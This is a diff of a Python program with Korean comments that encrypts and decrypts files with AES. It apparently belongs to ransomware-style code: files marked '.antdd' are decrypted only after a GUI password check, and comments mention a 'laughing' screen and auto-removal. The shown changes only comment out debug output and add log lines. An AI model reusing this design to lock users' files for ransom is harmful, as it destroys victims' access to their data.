@@ -269,9 +269,11 @@ def enc(key, cipher, in_filename, out_filename=None):
             outfile.write(e_data)
 
     # write가 완료된 상태에서 out_file을 읽어보자
+    '''
     with open(out_filename, 'rb') as result:
         print("4. encryption result is: ", out_filename)
         print(result.read())
+    '''
 
     # print("---END ENCRYPTION : AES")
 
@@ -328,10 +330,11 @@ def dec(cipher, in_filename, out_filename=None):
     # write가 완료된 상태에서 out_file을 읽어보자
     # 읽을 때 rb가 아니라 r로 읽으면
     # UnicodeDecodeError: 'cp949' codec can't decode byte 0xed in position 7: illegal multibyte sequence
+    '''
     with os.open(out_filename, 'rb') as result:
         print("4. decryption result is: ", out_filename)
         print(result.read())
-
+    '''
     # print("---END DECRYPTION : AES")
 
 
@@ -386,13 +389,21 @@ class RealMain:
         print("gui로부터 입력한 pw: ", input)
         if (str(self.test_input_key) == input):  # 메일 서버로 private key 연결해와야함
             # if (self.private_key == input):
-            print("==")
+            print("self.test_input_key==input")
+            '''
+            if( PKCS1_OAEP.new(input)==self.cipher ):
+                print("same cipher instance!")
+            else:
+                print("wrong cipher instance!")
+            '''
             for file in dec_list_files(os.getcwd()):# 현재 디렉토리 내부에 antdd를 파일리스트로 가져온다
-                dec(self.cipher, file)
+                dec(self.cipher, file, out_filename=None)
+            print("---dec_by_cipher end")
+
             # gui laughing으로 바꾸는 함수도 호출
             # auto_remove 호출
         else:
-            print("!=")
+            print("self.test_input_key!=input")
 
 if __name__ == "__main__":
     rInstance = RealMain()
